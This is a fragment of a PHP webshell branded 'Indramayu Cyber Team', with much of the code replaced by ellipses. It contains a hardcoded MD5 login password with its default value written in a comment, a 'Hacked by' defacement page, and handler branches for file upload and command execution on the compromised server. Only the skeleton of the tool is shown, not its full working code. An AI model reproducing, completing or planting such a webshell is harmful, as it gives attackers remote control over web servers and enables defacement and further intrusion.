...
#©®PalembangCyberTeam#                  
######################
$auth_pass = "c4ca4238a0b923820dcc509a6f75849b"; // default: indramayu
...
<html>
<head>
<title> Webshell ./sTory An9el</title>
<style type="text/css">
html {
	margin: 20px auto;
	background: black;
...
</head><center><body> <img src="https://1.bp.blogspot.com/-xSxMospbeTo/YPrcVaJslbI/AAAAAAAAALo/b167YRXyf1gVml-s-pjsnalHG9LqmlFyQCLcBGAsYHQ/w285-h244/gif_07-21-10.50.10.gif" height="250" width="1000"><H1>INDRAMAYU CYBER TEAM</body></center>
<form method="post">
...
<html>
<head>
<title>Hacked by./sTory An9el</title>
...
</head><center><body> <img src="https://i.ibb.co/vzX0Q1n/news.png" height="250" width="1000"><H1>Indramayu-C-T</body></center>
<?php
...
elseif($_GET['do'] == 'upload') {
 ...
 elseif($_GET['do'] == 'cmd') {
    ...
    <textarea name='script' style='width: 450px; height: 200px;'>Pal-C-T</textarea><br>
...
echo "<hr>";
    ...
    echo "<center>Copyright<font color=lime>./sTory An9el INDRAMAYU CYBER TEAM</font></a></center>";
}
?>
</html>